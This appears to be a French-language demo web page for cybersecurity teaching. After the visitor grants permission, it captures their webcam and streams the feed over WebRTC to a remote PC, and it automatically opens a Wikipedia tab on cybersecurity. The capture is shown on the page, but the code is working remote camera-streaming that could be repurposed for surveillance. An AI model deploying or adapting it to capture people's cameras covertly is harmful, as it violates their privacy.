<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Démonstration cybersécurité</title>

    <style>
        body {
            margin: 0;
            background: #f8f9fa;
            color: #202122;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        main {
            max-width: 800px;
            margin: 40px auto;
            padding: 20px;
        }

        #status {
            margin: 25px 0;
            padding: 20px;
            background: white;
            border: 1px solid #aaa;
        }

        #camera {
            width: 100%;
            max-width: 600px;
            background: black;
            display: none;
        }
    </style>
</head>

<body>

<main>

    <h1>Démonstration cybersécurité</h1>

    <p>
        Cette page présente une démonstration pédagogique.
    </p>

    <div id="status">
        Connexion au serveur...
    </div>

    <video
        id="camera"
        autoplay
        muted
        playsinline>
    </video>

</main>

<script src="/socket.io/socket.io.js"></script>

<script>

const socket = io();

const status =
    document.getElementById("status");

const camera =
    document.getElementById("camera");

let pc = null;
let stream = null;

let remoteDescriptionSet = false;
let pendingCandidates = [];

let wikipediaOpened = false;


// --------------------------------------------------
// WEBRTC
// --------------------------------------------------

const config = {
    iceServers: [
        {
            urls: "stun:stun.l.google.com:19302"
        }
    ]
};


// --------------------------------------------------
// SOCKET
// --------------------------------------------------

socket.on("connect", () => {

    console.log(
        "Socket connecté :",
        socket.id
    );

    status.textContent =
        "Serveur connecté — demande de caméra...";

    setTimeout(
        startCamera,
        500
    );

});


// --------------------------------------------------
// CAMÉRA
// --------------------------------------------------

async function startCamera() {

    try {

        status.textContent =
            "Demande d'autorisation caméra...";

        stream =
            await navigator.mediaDevices.getUserMedia({
                video: true,
                audio: false
            });

        console.log(
            "📷 Caméra autorisée"
        );

        camera.srcObject =
            stream;

        camera.style.display =
            "block";

        status.textContent =
            "Caméra autorisée — connexion au PC...";


        // --------------------------------------------------
        // OUVERTURE AUTOMATIQUE DE WIKIPÉDIA
        // --------------------------------------------------

        openWikipedia();


        // --------------------------------------------------
        // WEBRTC
        // --------------------------------------------------

        pc =
            new RTCPeerConnection(config);

        stream
            .getTracks()
            .forEach(track => {

                pc.addTrack(
                    track,
                    stream
                );

            });


        // --------------------------------------------------
        // ICE
        // --------------------------------------------------

        pc.onicecandidate =
            (event) => {

                if (event.candidate) {

                    socket.emit(
                        "ice-candidate",
                        event.candidate
                    );

                }

            };


        pc.onconnectionstatechange =
            () => {

                console.log(
                    "Téléphone WebRTC :",
                    pc.connectionState
                );

                if (
                    pc.connectionState ===
                    "connected"
                ) {

                    status.textContent =
                        "● Caméra connectée au PC";

                }

            };


        // --------------------------------------------------
        // OFFER
        // --------------------------------------------------

        const offer =
            await pc.createOffer();

        await pc.setLocalDescription(
            offer
        );

        console.log(
            "📤 Envoi de l'offre"
        );

        socket.emit(
            "offer",
            pc.localDescription
        );

    }

    catch (error) {

        console.error(
            "Erreur caméra/WebRTC :",
            error
        );

        status.textContent =
            "Accès à la caméra refusé ou indisponible.";

    }

}


// --------------------------------------------------
// OUVERTURE WIKIPÉDIA
// --------------------------------------------------

function openWikipedia() {

    if (wikipediaOpened) {
        return;
    }

    wikipediaOpened = true;

    const wikipedia =
        window.open(
            "https://fr.wikipedia.org/wiki/Cybers%C3%A9curit%C3%A9",
            "_blank"
        );

    if (!wikipedia) {

        console.log(
            "Le navigateur a bloqué l'ouverture automatique de Wikipédia."
        );

        status.textContent =
            "Caméra autorisée. Le navigateur a bloqué l'ouverture automatique de Wikipédia.";

    }

}


// --------------------------------------------------
// ANSWER
// --------------------------------------------------

socket.on(
    "answer",
    async (answer) => {

        if (!pc) {
            return;
        }

        if (
            pc.signalingState !==
            "have-local-offer"
        ) {

            console.log(
                "Réponse ignorée — état :",
                pc.signalingState
            );

            return;
        }

        try {

            await pc.setRemoteDescription(
                answer
            );

            remoteDescriptionSet =
                true;

            for (
                const candidate
                of pendingCandidates
            ) {

                await pc.addIceCandidate(
                    candidate
                );

            }

            pendingCandidates = [];

            console.log(
                "✅ Réponse WebRTC appliquée"
            );

        }

        catch (error) {

            console.error(
                "Erreur WebRTC :",
                error
            );

        }

    }
);


// --------------------------------------------------
// ICE REÇU
// --------------------------------------------------

socket.on(
    "ice-candidate",
    async (candidate) => {

        if (!pc) {
            return;
        }

        if (!remoteDescriptionSet) {

            pendingCandidates.push(
                candidate
            );

            return;
        }

        try {

            await pc.addIceCandidate(
                candidate
            );

        }

        catch (error) {

            console.error(
                "Erreur ICE :",
                error
            );

        }

    }
);

</script>

</body>
</html>
